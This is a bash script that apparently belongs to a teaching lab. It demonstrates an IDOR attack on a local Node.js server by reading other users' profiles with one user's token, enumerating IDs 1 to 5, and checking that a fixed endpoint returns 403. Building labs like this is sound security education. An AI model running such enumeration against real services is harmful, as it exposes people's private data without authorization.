#!/bin/bash
# IDOR attack script - run this on Kali after cloning the repo and
# starting the server (node server.js), pointed at the server's IP.
#
# Usage: ./attack.sh <SERVER_IP> [PORT]
# Example: ./attack.sh 192.168.230.1 3000

HOST="${1:-localhost}"
PORT="${2:-3000}"
BASE="http://${HOST}:${PORT}"

echo "=== Step 1: Log in as alice (a normal, legitimate user) ==="
LOGIN_RESPONSE=$(curl -s -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}')
echo "$LOGIN_RESPONSE"

TOKEN=$(echo "$LOGIN_RESPONSE" | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
echo "Got token: $TOKEN"
echo ""

echo "=== Step 2: Request MY OWN profile (id=1) - should work normally ==="
curl -s "$BASE/api/user/1" -H "Authorization: $TOKEN"
echo ""
echo ""

echo "=== Step 3: ATTACK - request id=2 (bob) using alice's token ==="
echo "    (alice should NOT be able to see bob's data, but watch...)"
curl -s "$BASE/api/user/2" -H "Authorization: $TOKEN"
echo ""
echo ""

echo "=== Step 4: ATTACK - request id=3 (carol) using alice's token ==="
curl -s "$BASE/api/user/3" -H "Authorization: $TOKEN"
echo ""
echo ""

echo "=== Step 5: Same attack against the FIXED endpoint ==="
echo "    (this should correctly return 403 Forbidden)"
curl -s -i "$BASE/api/secure/user/2" -H "Authorization: $TOKEN" | tail -5
echo ""

echo "=== Step 6: Automated enumeration - dump every user's data ==="
for id in 1 2 3 4 5; do
  echo "--- user id=$id ---"
  curl -s "$BASE/api/user/$id" -H "Authorization: $TOKEN"
  echo ""
done
